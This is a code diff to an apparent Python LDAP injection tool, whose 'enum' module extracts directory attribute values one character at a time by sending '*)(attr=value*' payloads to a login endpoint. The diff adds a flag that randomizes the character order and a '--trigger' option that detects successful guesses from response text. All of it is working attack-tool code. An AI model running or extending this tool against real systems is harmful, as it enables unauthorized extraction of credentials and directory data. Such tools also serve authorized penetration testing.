@@ -12,6 +12,7 @@ from urllib.parse import urlparse, quote_plus, parse_qs
 import json
 import re
 import copy
+import random
 import urllib3
 from sty import fg, Style, RgbFg
 
@@ -95,6 +96,11 @@ def brute(args, url_str, header_json, data_json, proxy, method, form="json"):
 
       # TODO: implement smart trigger
 
+
+def shuffle(string):
+  l = list(string)
+  random.shuffle(l)
+  return ''.join(l)
       
 
 def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
@@ -111,7 +117,10 @@ def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
     value = ""
     finish = False
     while not finish:
-      for char in alphabet: #In each possition test each possible printable char
+      alphabet_ = alphabet
+      if args.random == True:
+        alphabet_ = shuffle(alphabet)
+      for char in alphabet_: # In each possition test each possible printable char
         query = "*)({}={}{}*".format(attribute, value, char)
 
         # if base64 encoded:
@@ -136,7 +145,10 @@ def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
         # TODO: implement smart trigger
         # first, send the request without modification
         # compare the following responses with the first request.
-        if "Cannot login" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
+        if args.trigger in r.text:
+          value += str(char)
+          break
+        elif "Cannot login" in r.text and "NOT_FOUND" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
           value += str(char)
           break
 
@@ -236,8 +248,10 @@ def main():
   parser.add_argument('--proxy', dest='proxy', type=str, default='', help="Use a proxy to connect to the target URL. Example: --proxy 127.0.0.1:8080")
   parser.add_argument('--encode', dest='encode', type=str, default='', help="Encode the payload: base64, url")
   parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: brute, enum, dump (TODO)")
+  parser.add_argument('--random', dest='random', action='store_true', help="Randomize the alphabet for the module 'enum'")
   parser.add_argument('--method', dest='method', type=str, default='', help="Force using a given HTTP method.")
   parser.add_argument('--loglevel', dest='loglevel', default='WARNING', help="DEBUG, INFO, WARNING, ERROR")
+  parser.add_argument('--trigger', dest='trigger', type=str, default='', help="String to search for in the response. If found, something interesting happend.")
   args = parser.parse_args()
 
   logging.basicConfig(level=getattr(logging, args.loglevel))
